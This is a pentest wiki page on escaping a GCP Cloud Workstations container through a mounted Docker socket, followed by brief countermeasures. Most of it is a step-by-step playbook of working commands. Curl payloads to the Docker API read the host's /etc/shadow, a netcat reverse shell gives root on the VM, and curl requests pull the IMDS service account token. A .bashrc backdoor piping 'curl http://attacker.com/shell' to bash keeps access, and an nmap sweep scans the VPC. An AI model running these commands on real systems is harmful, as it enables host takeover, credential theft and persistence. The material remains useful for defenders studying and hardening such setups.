# GCP - Cloud Workstations Privesc

## Container Breakout via Docker Socket (Container -> VM -> Project)

The primary privilege escalation path in Cloud Workstations stems from the requirement to support **Docker-in-Docker (DinD)** workflows for developers. When the workstation configuration mounts the Docker socket or allows privileged containers (a common configuration), an attacker inside the workstation container can escape to the underlying Compute Engine VM and steal its service account token.

!!! danger "All Predefined Images Are Vulnerable"
    Every predefined Cloud Workstation image Google ships exposes the Docker socket. Tested against:
    ```
    us-central1-docker.pkg.dev/cloud-workstations-images/predefined/code-oss:latest
    ```
    This attack works as a **non-root user** with **no `docker` CLI** and **no network access** to install packages. The only requirement is a mounted Docker socket.

**Prerequisites:**

- Access to a Cloud Workstation terminal (via SSH, compromised session, or stolen credentials)
- The workstation configuration must mount `/var/run/docker.sock` or enable privileged containers

**Architecture context:** The workstation is a container (Layer 3) running on a Docker/Containerd runtime (Layer 2) on a GCE VM (Layer 1). The Docker socket gives direct access to the host's container runtime.

!!! note "Automated Tool"
    The tool [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript) automates the full container escape and drops you into a root shell on the host VM. It uses only Python's standard library — no `docker` CLI, no `pip` packages, no network access required.

![Cloud Workstations Container Breakout Architecture](https://github.com/user-attachments/assets/814bbb3c-1be4-44fd-aa48-8570ad7be3e3)

### Exploitation Steps

??? example "Step 1: Check for Docker socket"

    ```bash
    # Verify the Docker socket is available
    ls -l /var/run/docker.sock
    # Expected output: srw-rw---- 1 root docker 0 ...
    ```

    If you see the socket, you can proceed — even without root or the `docker` CLI.

??? example "Step 2: Escape to the host VM filesystem"

    === "curl (no docker CLI needed)"

        If the `docker` CLI is not installed, you can talk directly to the Docker Engine API over the Unix socket using `curl`:

        **Extract files from the host:**

        ```bash
        # Create a payload to read host files
        cat <<EOF > payload_loot.json
        {
          "Image": "alpine",
          "Cmd": ["/bin/sh", "-c", "echo '---SHADOW---'; cat /mnt/host/etc/shadow; echo '---PASSWD---'; cat /mnt/host/etc/passwd"],
          "HostConfig": {
            "Binds": ["/:/mnt/host"],
            "Privileged": true,
            "NetworkMode": "host"
          },
          "Tty": false
        }
        EOF

        # Create the container
        curl -X POST --unix-socket /var/run/docker.sock \
          -H "Content-Type: application/json" \
          -d @payload_loot.json \
          "http://localhost/containers/create?name=pwn_loot"

        # Start it
        curl -X POST --unix-socket /var/run/docker.sock \
          "http://localhost/containers/pwn_loot/start"

        # Read the output (host /etc/shadow and /etc/passwd)
        curl --unix-socket /var/run/docker.sock \
          "http://localhost/containers/pwn_loot/logs?stdout=true&stderr=true"

        # Clean up
        curl -X DELETE --unix-socket /var/run/docker.sock \
          "http://localhost/containers/pwn_loot?force=true"
        ```

        **Get an interactive root shell:**

        ```bash
        # Start a listener in a separate terminal
        nc -lvp 4444

        # Create a reverse shell payload (127.0.0.1 works due to NetworkMode: host)
        cat <<EOF > payload_shell.json
        {
          "Image": "alpine",
          "Cmd": ["/bin/sh", "-c", "apk add --no-cache netcat-openbsd; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f"],
          "HostConfig": {
            "Binds": ["/:/mnt/host"],
            "Privileged": true,
            "NetworkMode": "host"
          },
          "Tty": false
        }
        EOF

        # Create and start
        curl -X POST --unix-socket /var/run/docker.sock \
          -H "Content-Type: application/json" \
          -d @payload_shell.json \
          "http://localhost/containers/create?name=pwn_shell"

        curl -X POST --unix-socket /var/run/docker.sock \
          "http://localhost/containers/pwn_shell/start"
        ```

        You now have a **root shell on the underlying Compute Engine VM** (Layer 1).

    === "docker CLI (if available)"

        If the `docker` CLI is installed, the escape is a one-liner:

        ```bash
        # Spawn a privileged container mounting the host's root filesystem
        docker run -it --rm --privileged --net=host --pid=host \
          -v /:/mnt/host \
          alpine sh

        # Inside the new container, chroot into the host
        chroot /mnt/host /bin/bash
        ```

        You now have a **root shell on the underlying Compute Engine VM** (Layer 1).

??? example "Step 3: Steal the VM service account token from IMDS"

    ```bash
    # From the host VM, query the Instance Metadata Service
    curl -s -H "Metadata-Flavor: Google" \
      http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

    # Check which service account is attached
    curl -s -H "Metadata-Flavor: Google" \
      http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

    # Check scopes (CRITICAL STEP)
    curl -s -H "Metadata-Flavor: Google" \
      http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
    ```

!!! warning "Check the Scopes!"
    Even if the attached Service Account is **Editor**, the VM might be restricted by access scopes.
    If you see `https://www.googleapis.com/auth/cloud-platform`, you have full access.
    If you only see `logging.write` and `monitoring.write`, you are limited to the **Network Pivot** and **Persistence** vectors below.

??? example "Step 4: Achieve Persistence (Backdoor the User)"

    Cloud Workstations mount a persistent disk to `/home/user`. Because the container user (usually `user`, UID 1000) matches the host user (UID 1000), you can write to the host's home directory. This allows you to backdoor the environment even if the workstation container is rebuilt.

    ```bash
    # Check if you can write to the host's persistent home
    ls -la /mnt/host/home/user/

    # Drop a backdoor that executes next time the developer logs in
    # Note: Do this from the container escape context
    echo "curl http://attacker.com/shell | bash" >> /mnt/host/home/user/.bashrc
    ```

??? example "Step 5: Network Pivot (Internal VPC Access)"

    Since you share the host network namespace (`--net=host`), you are now a trusted node on the VPC. You can scan for internal services that allow access based on IP whitelisting.

    ```bash
    # Install scanning tools on the host (if internet access allows)
    apk add nmap

    # Scan the internal VPC subnet
    nmap -sS -p 80,443,22 10.0.0.0/8
    ```

## Why Common Hardening Fails

!!! failure "These mitigations do NOT prevent this attack"
    - **Removing root access** — The Docker daemon runs as root on the host. Any user with write access to the socket can spawn privileged containers regardless of their own UID.
    - **Removing the `docker` CLI** — The CLI is just a wrapper around the Docker Engine API. `curl --unix-socket` or Python's standard library can do everything the CLI does.
    - **Network restrictions** — The exploit only talks to a local Unix socket. No outbound network access, no package installs required.

## Countermeasures

- **Remove the Docker socket** — Do not mount `/var/run/docker.sock` into workstation containers. This is the only mitigation that fully closes the door.
- **Use Cloud Build** for container builds instead of local Docker — keep the build plane separate from the dev plane
- Assign a **custom service account** with minimal permissions to workstation configurations (e.g., `roles/source.reader`, `roles/artifactregistry.reader`)
- Place the workstation project inside a **VPC Service Controls** perimeter
- **Monitor IMDS access** from workstation VMs — a workstation container should never be querying the metadata service directly
